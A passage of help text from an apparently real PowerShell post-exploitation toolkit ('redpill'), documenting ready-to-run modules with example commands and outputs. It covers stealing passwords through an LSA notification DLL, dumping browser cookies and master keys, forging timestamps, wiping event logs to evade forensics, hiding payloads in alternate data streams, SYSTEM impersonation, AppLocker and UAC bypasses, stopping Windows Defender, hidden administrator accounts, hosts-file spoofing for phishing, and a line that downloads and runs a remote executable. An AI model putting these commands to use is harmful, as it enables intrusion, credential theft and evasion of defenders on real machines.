      Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.

   .OUTPUTS
      16:32:55 - Brute force Zip archives
      -----------------------------------
      Zip Archive  : redpill.zip
      Archive Size : 7429,9765625/KB
      Password     : King!123
      -----------------------------------
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "CleanTracks"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Clean artifacts {temp,logs,scripts}

   .DESCRIPTION
      Module to clean artifacts that migth lead
      forensic investigatores to attacker tracks.

   .NOTES
      Required Dependencies: cmd|regedit {native}
      Paranoid @argument deletes @redpill auxiliary
      scripts and Deletes All eventvwr logs {admin privs}

   .Parameter CleanTracks
      Accepts arguments: Clear and Paranoid (default: Clear)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CleanTracks Clear
      Basic cleanning {flushdns,Prefetch,Recent,tmp *log|*bat|*vbs}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CleanTracks Paranoid
      Deletes @redpill auxiliary scripts and All eventvwr logs {admin}

   .OUTPUTS
      Function    Date     DataBaseEntrys ModifiedRegKeys ScriptsCleaned
      --------    ----     -------------- --------------- --------------
      CleanTracks 22:17:29 20             3               2
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetPasswords" -or $Help -ieq "StartDir"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @mubix {MITRE T1174} | @r00t-3xp10it
      Helper - Stealing passwords every time they change {MITRE T1174}
      Helper - Search for creds in diferent locations {store|regedit|disk}

   .DESCRIPTION
      -GetPasswords 'Enum' search creds in store\reg\disk diferent locations.
      -GetPasswords 'Dump' Explores a native OS notification of when the user
      account password gets changed which is responsible for validating it.

   .NOTES
      -GetPasswords 'Dump' requires Administrator privileges to run!
      To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
      from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key by executing:
      REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f

   .Parameter GetPasswords
      Accepts arguments: Enum and Dump (default: Enum)

   .Parameter StartDir
      The directory where to start search recursive (default: %userprofile%)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Enum
      Search for creds in store\regedit\disk {txt\xml\logs} diferent locations

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Enum -StartDir `$Env:USERPROFILE
      Search recursive for creds in store\regedit\disk {txt\xml\logs} starting in -StartDir directory

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Dump
      Intercepts user changed passwords {logon} by: @mubix

   .OUTPUTS
      Time     Status  ReportFile           VulnDLLPath
      ----     ------  ----------           -----------
      17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "FileMace" -or $Help -ieq "Date"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Change file mace time {timestamp}

   .DESCRIPTION
      This module changes the follow mace propertys:
      CreationTime, LastAccessTime, LastWriteTime

   .NOTES
      -Date parameter format: "08 March 1999 19:19:19"
      Remark: Double quotes are mandatory in -Date [ @argument ]

   .Parameter FileMace
      Accepts the absoluct \ relative path of file to modify

   .Parameter Date
      Accepts the timestamp data-format to modify file

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -FileMace `$Env:TMP\test.txt
      Changes sellected file mace using redpill default -Date [ "data-format" ]

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -FileMace `$Env:TMP\test.txt -Date "08 March 1999 19:19:19"
      Changes sellected file mace using user inputed -Date [ "data-format" ]

   .OUTPUTS
      FullName                        Exists CreationTime       
      --------                        ------ ------------       
      C:\Users\pedro\Desktop\test.txt   True 08/03/1999 19:19:19
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "MetaData" -or $Help -ieq "Extension"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display file\application description (metadata)
   
   .DESCRIPTION
      Display file\application description (metadata)

   .NOTES
      -Extension 'exe' parameter its used to recursive search starting in -MetaData
      directory for standalone executables (exe) and display is property descriptions.

   .Parameter MetaData
      Accepts the absoluct\relative path of file\appl to scan

   .Parameter Extension
      Used to recursive search for file extensions and displays metadata

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MetaData "`$Env:USERPROFILE\Desktop\CommandCam.exe"
      Display CommandCam.exe standalone executable file description (metadata)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MetaData "`$Env:USERPROFILE\Desktop" -Extension "exe"
      Search for [ exe ] recursive starting in -MetaData [ dir ] and display descriptions

   .OUTPUTS
      FileMetadata
      ------------
      Name           : CommandCam.exe
      CreationTime   : 23/02/2021 18:31:55
      LastAccessTime : 23/02/2021 18:31:55
      VersionInfo    : File:             C:\Users\pedro\Desktop\CommandCam.exe
                       InternalName:     CommandCam.exe
                       OriginalFilename: CommandCam.exe
                       FileVersion:      0.0.2.8
                       FileDescription:  meterpeter WebCamSnap
                       Product:          meterpeter WebCamSnap
                       ProductVersion:   1.0.2.8
                       Debug:            False
                       Patched:          False
                       PreRelease:       False
                       PrivateBuild:     True
                       SpecialBuild:     False
                       Language:         Idioma neutro
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "NetTrace" -or $Help -ieq "Storage"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Agressive sytem enumeration with netsh

   .NOTES
      Required Dependencies: netsh {native}
      Required Dependencies: Administrator privilges on shell
      Remark: Dump will be saved under %TMP%\NetTrace.cab {default}

   .Parameter NetTrace
      Accepts argument: Enum

   .Parameter Storage
      Where to store the dump zip archive (default: %tmp%)
      
   .EXAMPLE
      PS C:> powershell -File redpill.ps1 -NetTrace Enum

   .EXAMPLE
      PS C:> powershell -File redpill.ps1 -NetTrace Enum -Storage %TMP%

   .OUTPUTS
      Trace configuration:
      -------------------------------------------------------------------
      Status:             Running
      Trace File:         C:\Users\pedro\AppData\Local\Temp\NetTrace.etl
      Append:             Off
      Circular:           On
      Max Size:           4096 MB
      Report:             Off
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "PingSweep" -or $Help -ieq "Range"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate active IP Address {Local Lan}

   .DESCRIPTION
      Module to enumerate active IP address of Local Lan
      for possible Lateral Movement oportunitys. It reports
      active Ip address in local lan and scans for open ports
      in all active ip address found by -PingSweep Enum @arg.
      Remark: This module uses ICMP packets (ping) to scan..

   .NOTES
      Required Dependencies: .Net.Networkinformation.ping {native}
      Remark: Ping Sweep module migth take a long time to finish
      depending of -Range parameter user input sellection or if
      the Verbose @Argument its used to scan for open ports and
      resolve ip addr Dns-NameHost to better identify the device.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Enum
      Enumerate All active IP Address on Local Lan {range 1..255}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Enum -Range "65,72"
      Enumerate All active IP Address on Local Lan within the Range selected

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Verbose -Range "1,255"
      Enumerate IP addr + open ports + resolve Dns-NameHost in all IP's found

   .OUTPUTS
      Range[65..72] Active IP Address on Local Lan
      --------------------------------------------
      Address       : 192.168.1.65
      Address       : 192.168.1.66
      Address       : 192.168.1.70
      Address       : 192.168.1.72
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "ADS" -or $Help -ieq "HiddeDataOf" -or $Help -ieq "StartDir" -or $Help -ieq "InLegitFile"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Hidde scripts {txt|bat|ps1|exe} on `$DATA records (ADS)
   
   .DESCRIPTION
      Alternate Data Streams (ADS) have been around since the introduction
      of windows NTFS. Basically ADS can be used to hide the presence of a
      secret or malicious file inside the file record of an innocent file.

   .NOTES
      Required Dependencies: Payload.bat|ps1|txt|exe + legit.txt
      This module hiddes {txt|bat|ps1|exe} `$DATA inside ADS records.
      Remark: Payload.[extension] + legit.txt must be on the same dir.
      Remark: Supported Payload Extensions are: txt | bat | ps1 | exe

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "`$Env:TMP"
      Search recursive for payload.bat ADS stream record existence starting on -StartDir [ dir ]

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
      Hidde the data of Payload.bat script inside legit.txt ADS `$DATA record

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
      Execute\Access the alternate data stream of the sellected -InTextFile [ file ]

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
      Delete payload.bat ADS `$DATA stream from legit.txt text file records

   .OUTPUTS
      AlternateDataStream
      -------------------
      C:\Users\pedro\AppData\Local\Temp\legit.txt

      [cmd prompt] AccessHiddenData
      -----------------------------
      wmic.exe process call create "C:\Users\pedro\AppData\Local\Temp\legit.txt:payload.exe"
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "psgetsys"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Credits: C# borrowed from @decoder-it
      Helper - spawn a process under a different parent process!

   .DESCRIPTION
      Normally when a process launches a child process, it becomes the parent of the child process.
      If we create a new process setting also the parent process property, the child process will inherit
      the token of the specified parent process and impersonate this one. So if we create a new process,
      setting the parent PID the process owned by SYSTEM, we get a SYSTEM priv escalation technic! (EOP)

   .NOTES
      We need to have elevated rights in order to create a process from the parent process handle,
      typically seDebugPrivilege which administrators have (note: if a regular user has this privilege
      too, he has the keys for the kingdom!). Keep in mind that this privilege is available only from
      an elevated command prompt.
   
   .Parameter Filter
      Display process names by filtering token privs (default: false)
   
   .Parameter Parent
      The parent process name to inherit tokens from (default: lsass)

   .Parameter Child
      The child process to spawnm, absoluct path (default: `$Env:WINDIR\system32\cmd.exe)

   .Parameter CmdLine
      The cmdline to execute through the child process (default: false)

   .Parameter LogFile
      The logfile to create absoluct\relative path (default: false)
   
   .Parameter Clean
      Delete eventvwr Powershell/Operational logs? (default: false)
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys Enum -Filter "NT AUTHORITY\SYSTEM"
      Query for processes with '<SYSTEM>' privileges attached.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys enum -Filter "NT AUTHORITY\SYSTEM" -LogFile "psgetsys.log"
      Query for processes with '<SYSTEM>' privs attached and store data in logfile.
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys impersonate -Parent "random" -Child "`$PSHOME\Powershell.exe"
      Let cmdlet auto-sellect the first '<SYSTEM>' process.Id to use as Parent.   

   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys impersonate -Parent "explorer" -Child "`$Env:WINDIR\system32\cmd.exe"
      Spawn child process (cmd) with privs inherit from parent process (SKYNET\pedro)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys impersonate -Parent "lsass" -Child "`$PSHOME\Powershell.exe"
      Spawn child process (PS) with privs inherit from parent process (NT AUTHORITY\SYSTEM)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys impersonate -Parent "lsass" -Child "`$Env:WINDIR\system32\cmd.exe" -CmdLine "cmd /c whoami > zzz.txt"
      Spawn child process (cmd) with privs inherit from parent process (lsass::SYSTEM) that silent executes -CmdLine  
   
   .OUTPUTS
      * Checking module dependencies ..

      [+] Got Handle for ppid: 968 (lsass)
      [+] Updated process attribute list ..
      [+] Starting C:\WINDOWS\system32\cmd.exe...True - pid: 12564
   
      Responding Name    Id Description               UserName
      ---------- ----    -- -----------               --------
            True cmd  12564 Windows Command Processor NT AUTHORITY\SYSTEM

   .LINK
      https://github.com/r00t-3xp10it/redpill
      https://github.com/decoder-it/psgetsystem
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "AppLocker" -or $Help -ieq "GroupName" -or $Help -ieq "FolderRigths" -or $Help -ieq "Verb"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate directorys with weak permissions (bypass applocker)

   .DESCRIPTION
      Applocker.ps1 module starts search recursive in %WINDIR% directory
      location for folders with weak permissions {Modify,Write,FullControl}
      that can be used to bypass system AppLocker binary execution policy Or
      to execute batch scripts converted to text format if blocked by applock!

   .NOTES
      AppLocker.ps1 by Default uses 'BUILTIN\Users' Group Name to search recursive
      for directorys with 'Write' access on %WINDIR% tree. This module also allow
      users to sellect diferent GroupName(s), FolderRigths Or StartDir @arguments!

   .Parameter Verb
      Accepts arguments: True, False (default: False)

   .Parameter AppLocker
      Accepts arguments: Enum, WhoAmi, TestBat, XmlBypass (default: Enum)

   .Parameter StartDir
      [Enum] The absoluct path where to start search recursive (default: %windir%)

   .Parameter FolderRigths
      Accepts permissions: Modify, Write, FullControll, ReadAndExecute (default: Write)

   .Parameter GroupName
      Accepts GroupNames: Everyone, BUILTIN\Users, NT AUTHORITY\INTERACTIVE (default: BUILTIN\Users)

   .Parameter Execute
      [XmlBypass] The appl Name OR the appl to execute absoluct path! (default: cmd.exe)

   .Parameter TimeOpen
      [XmlBypass] The TimeOut to maintain the application open! (default: 1 seconds)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -AppLocker WhoAmi
      Enumerate ALL Group Names available on local machine

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -AppLocker TestBat
      Test AppLocker for Batch script execution bypass (`$ADS)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -AppLocker "`$Env:TMP\payload.bat"
      Execute 'payload.bat' through `$ADS text format bypass technic!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -AppLocker XmlBypass -Execute "`$PSHome\Powershell.exe"
      Execute 'Powershell.exe' trougth CVE-2018-8492 Windows Device Guard XML bypass!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -AppLocker XmlBypass -Execute "cmd.exe" -TimeOpen 5
      Execute 'cmd.exe' trougth CVE-2018-8492 WDG XML bypass! (close cmd after 5 sec)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -AppLocker XmlBypass -Execute "calc.exe" -Verb True
      Skip cmdlet vulnerability tests to execute 'calc.exe' through WDG XML bypass technic!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
      Enumerate directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions active!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl"
      Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions active!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl" -StartDir "`$Env:PROGRAMFILES"
      Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions recursive starting in -StartDir [ dir ]

   .OUTPUTS
      AppLocker - Weak Directory permissions
      --------------------------------------
      VulnId            : 1::ACL (Mitre T1222)
      FolderPath        : C:\WINDOWS\tracing
      IdentityReference : BUILTIN\\Utilizadores
      FileSystemRights  : Write
      IsInHerit?        : False

      VulnId            : 2::ACL (Mitre T1222)
      FolderPath        : C:\WINDOWS\System32\Microsoft\Crypto\RSA\MachineKeys
      IdentityReference : BUILTIN\\Utilizadores
      FileSystemRights  : Write
      IsInHerit?        : True
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "DnsSpoof" -or $Help -ieq "Domain" -or $Help -ieq "ToIPaddr"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Redirect Domain Names to our Phishing IP address (dns spoof)
   
   .DESCRIPTION
      Remark: This module its [ deprecated ]
      Redirect Domain Names to our Phishing IP address

   .NOTES
      Required Dependencies: Administrator privileges on shell
      Remark: This will never work if the server uses CDN or
      virtual hosts This only applies on servers with dedicated IPs.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DnsSpoof Enum
      Display hosts file content (dns resolver)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DnsSpoof Redirect -Domain "www.facebook.com" -ToIPaddr "192.168.1.72"
      Backup original hosts file and redirect Domain Name www.facebook.com To IPaddress 192.168.1.72

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DnsSpoof Clear
      Revert hosts file to is original state before DnSpoof changes.

   .OUTPUTS
      Redirecting Domains Using hosts File (Dns Spoofing)
      Clean dns cache before adding entry to hosts file.
      Redirect Domain: www.facebook.com TO IPADDR: 192.168.1.72
      ---------------------------------------------------------
      # This file contains the mappings of IP addresses to host names. Each
      # entry should be kept on an individual line. The IP address should
      # be placed in the first column followed by the corresponding host name.
      # The IP address and the host name should be separated by at least one
      # space.
      #
      # Additionally, comments (such as these) may be inserted on individual
      # lines or following the machine name denoted by a '#' symbol.
      #
      # For example:
      #
      #      102.54.94.97     rhino.acme.com          # source server
      #       38.25.63.10     x.acme.com              # x client host
      # localhost name resolution is handled within DNS itself.
      #	127.0.0.1       localhost
      #	::1             localhost
      192.168.1.72 www.facebook.com
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "DisableAV" -or $Help -ieq "ServiceName"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @Sordum {RedTeam} | @r00t-3xp10it
      Disable Windows Defender Service (WinDefend) 

   .DESCRIPTION
      This CmdLet Query, Stops, Start Anti-Virus Windows Defender
      service without the need to restart or refresh target machine.

   .NOTES
      This cmdlet uses UacMe.ps1 to Escalate shell privileges to admin
      If DisableDefender its executed without administrator privileges!

   .Parameter DisableAV
      Accepts arguments: Query, Stop, Start (default: Query)

   .Parameter ServiceName
      The Windows Defender Service Name (default: WinDefend)

   .Parameter Delay
      Time (sec) to update the service state (default: 4)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DisableAV Query
      Querys the Windows Defender Service State

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DisableAV Start
      Starts the Windows Defender Service (WinDefend)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DisableAV Stop
      Stops the Windows Defender Service (WinDefend)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DisableAV Stop -Delay 7
      Give some time (sec) to update the service state (default: 4)

   .OUTPUTS
      Disable Windows Defender Service
      --------------------------------
      ServiceName      : WinDefend
      AMRversion       : 4.18.2104.14
      ShellPrivs       : UserLand::EOP
      StartType        : Automatic
      CurrentStatus    : Stopped
      CanStop          : False
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "HiddenUser"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Query\Create\Delete Hidden User Accounts!

   .DESCRIPTION
      This CmdLet Querys, Creates or Deletes windows hidden accounts.
      It also allow users to set the account 'Visible' or 'Hidden' state.

   .NOTES
      Required Dependencies: Administrator Privileges on shell
      Mandatory requirements to {Create|Delete} or set account {Visible|Hidden}
      The new created user account will be added to 'administrators' Group Name
      And desktop will allow multiple RDP connections if set -EnableRDP 'True'

   .Parameter HiddenUser
      Accepts arguments: Query, Verbose, Create, Delete, Visible, Hidden

   .Parameter UserName
      Accepts the User Account Name (default: SSAredTeam)

   .Parameter Password
      Accepts the User Account Password (default: mys3cr3tp4ss)

   .Parameter EnableRDP
      Accepts arguments: True and False (default: False)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Query
      Enumerate ALL Account's present in local system

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Verbose
      Enumerate ALL Account's present in local system and list
      All account's on Administrators Group Name

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "SSAredTeam"
      Creates 'SSAredTeam' hidden account without password access and 'Adminitrator' privs

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss"
      Creates 'SSAredTeam' hidden account with password 'mys3cr3tp4ss' and 'Adminitrator' privs

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss" -EnableRDP True
      Create 'SSAredTeam' Hidden User Account with 'mys3cr3tp4ss' login password and enables multiple RDP connections.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Visible -UserName "SSAredTeam"
      Makes 'SSAredTeam' User Account visible on logon screen

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Hidden -UserName "SSAredTeam"
      Makes 'SSAredTeam' User Account Hidden on logon screen (default)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Delete -UserName "SSAredTeam"
      Deletes 'SSAredTeam' hidden account

   .OUTPUTS
      Enabled Name               LastLogon           PasswordLastSet     PasswordRequired
      ------- ----               ---------           ---------------     ----------------
      False   Administrador                                                          True
      False   Convidado                                                             False
      False   DefaultAccount                                                        False
       True   pedro              20/03/2021 01:50:09 01/03/2021 19:53:46             True
      False   WDAGUtilityAccount                     01/03/2021 18:58:42             True
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "CsOnTheFly" -or $Help -ieq "Uri" -or $Help -ieq "OutFile"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download\Compile\Execute CS scripts On-The-Fly!

   .DESCRIPTION
      This CmdLet downloads\compiles script.cs (To exe) and executes the binary.

   .NOTES
      Required dependencies: BitsTransfer {native} | Microsoft.NET {native}
      This cmdlet allow users to download CS scripts from network [ -Uri http://script.cs ]
      Or simple to compile an Local CS script into a standalone executable and execute him!
      Remark: Compiling CS scripts using this module will NOT bypass in any way AV detection.
      Remark: URL's must be in RAW format [ https://raw.githubusercontent.com/../script.cs ]

   .Parameter CsOnTheFly
      Accepts arguments: Compile, Execute (default: Execute)

   .Parameter Uri
      URL of Script.cs to be downloaded OR Local script.cs absoluct\relative path

   .Parameter OutFile
      Standalone executable name to be created plus is absoluct\relative path

   .Parameter IconSet
      Accepts arguments: True or False (default: False)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute
      Create demo script.cs \ compile it to binary.exe and execute him!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute -IconSet True
      Create demonstration script.cs \ compile it to binary.exe and add
      redpill icon.ico to compiled standalone executable and execute him!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Compile -Uri "calc.cs" -OutFile "out.exe"
      Compiles Local -Uri [ calc.cs ] into an standalone executable (dont-execute-exe)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute -Uri "calc.cs" -OutFile "out.exe"
      Compiles Local -Uri [ calc.cs ] into an standalone executable and execute it.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -CsOnTheFly Execute -Uri "https://raw.github.com/../calc.cs" -OutFile "`$Env:TMP\out.exe"
      Downloads -Uri [ URL ] compiles the cs script into an standalone executable and executes the resulting binary.
      Remark: Downloading script.CS from network (https://raw.) will mandatory download them to %tmp% directory!

   .OUTPUTS
      Compiling SpawnPowershell.cs On-The-Fly!
      ----------------------------------------
      Microsoft.NET   : 4.8.03752
      NETCompiler     : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
      Uri             : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs
      OutFile         : C:\Users\pedro\AppData\Local\Temp\Installer.exe
      FileDescription : @redpill CS Compiled Executable
      Action          : Execute
      ApplIcon?       : False
      Compiled?       : True

      Directory                         Name          Length CreationTime       
      ---------                         ----          ------ ------------       
      C:\Users\pedro\AppData\Local\Temp Installer.exe   4096 06/04/2021 15:55:40
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "CookieHijack"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @rxwx | @r00t-3xp10it
      Helper - Microsoft Edge, Google Chrome Cookie Hijacking tool!

   .DESCRIPTION
      To hijack session cookies we first need to dump browser Master Key and the Cookie File.
      The Cookie files (Databases) requires to be manually downloaded from target system and
      imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!

   .NOTES
      Required dependencies: Edge =< 6.1.1123.0 | Chrome =< 89.0.4389.82
      Remark: Cookies are no longer stored as individual files on recent browser versions!
      Remark: The Cookie files (Databases) found will be stored on target %tmp% directory!
      Remark: The Login Data File can be imported into ChloniumUI.exe { Database field }
      to decrypt chrome browser passwords in plain text using the 'export' button!

   .Parameter CookieHijack
      Accepts arguments: Dump, History OR 'Local State' File absoluct path!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CookieHijack Dump
      Dump Microsoft Edge and Google Chrome Master Keys and cookie files
   
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CookieHijack History
      Enumerate Active Chrome|Edge typed url's history (url's) and
      Dump Microsoft Edge and Google Chrome Master Keys and cookie files 

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CookieHijack "`$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
      Dump Microsoft Edge Master Keys and cookie file

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CookieHijack "`$Env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
      Dump Google Chrome Master Keys and cookie file

   .OUTPUTS
      Cookie Hijacking!
      -----------------
      To hijack session cookies we first need to dump browser Master Key and Cookie Files.
      The Cookie files (Database) requires to be manually downloaded from target system and
      imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!

      Brower     : MicrosoftEdge
      Version    : 6.1.1123.0
      MasterKey  : wtXx6sM1482OWfsMXon6Am4Hi01idvFNgog3jTCsyAA=
      Database   : C:\Users\pedro\AppData\Local\Temp\Edge_Cookies

      Brower     : Chrome
      Version    : 89.0.4389.82     
      MasterKey  : 3Cms3YxFXVyJRUbulYCnxqY2dO/jubDkYBQBoYIvqfc=
      Database   : C:\Users\pedro\AppData\Local\Temp\Chrome_Cookies
      LoginData  : C:\Users\pedro\AppData\Local\Temp\Chrome_Login_Data

      Execute in attacker machine
      ---------------------------
      iwr -Uri shorturl.at/jryEQ -OutFile ChloniumUI.exe;.\ChloniumUI.exe
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "UacMe" -or $Help -ieq "Execute"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @_zc00l {dll reflection} | @r00t-3xp10it
      Helper - UAC bypass|EOP by dll reflection! (cmstp.exe)

   .DESCRIPTION
      This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
      using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
      and elevate privileges { user -> admin } or to exec one command with admin privs!

   .NOTES
      If executed with administrator privileges and the 'Elevate' @argument its sellected,
      then this cmdlet will try to elevate the "cmdline" from admin => NT AUTHORITY\SYSTEM!

   .Parameter UacMe
      Accepts arguments: Bypass, Elevate, Clean

   .Parameter Execute
      Accepts one cmdline OR application absoluct path to be executed!

   .Parameter Date
      Delete artifacts left behind by is 'CreationTime' (default: today)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -UacMe bypass -Execute "regedit.exe"
      Spawns regedit without uac asking for execution confirmation

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -UacMe Elevate -Execute "cmd.exe"
      Local spawns an cmd prompt with administrator privileges! 
   
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -UacMe Elevate -Execute "powershell.exe"
      Local spawns an powershell prompt with administrator privileges!
   
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -UacMe Elevate -Execute "powershell -file `$Env:TMP\DisableDefender.ps1 -Action Stop"
      Executes DisableDefender.ps1 script trougth uac bypass module with elevated shell privs {admin}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -UacMe Clean
      Deletes uac bypass artifacts and powershell eventvwr logs!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -UacMe Clean -Date "19/04/2021"
      Clean ALL artifacts left behind by this cmdlet by is 'CreationTime'

   .OUTPUTS
      Payload file written to C:\Windows\Temp\455pj4k3.inf

      Privilege Name                Description                                   State
      ============================= ============================================= ========
      SeShutdownPrivilege           Encerrar o sistema                            Disabled
      SeChangeNotifyPrivilege       Ignorar verificação transversal               Enabled
      SeUndockPrivilege             Remover computador da estação de ancoragem    Disabled
      SeIncreaseWorkingSetPrivilege Aumentar um conjunto de trabalho de processos Disabled
      SeTimeZonePrivilege           Alterar o fuso horário                        Disabled

      UAC State     : Enabled
      UAC Settings  : Notify Me
      EOP Trigger   : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
      RUN cmdline   : powershell -file C:\Users\pedro\AppData\Local\Temp\DisableDefender.ps1 -Action Stop
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetSkype"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
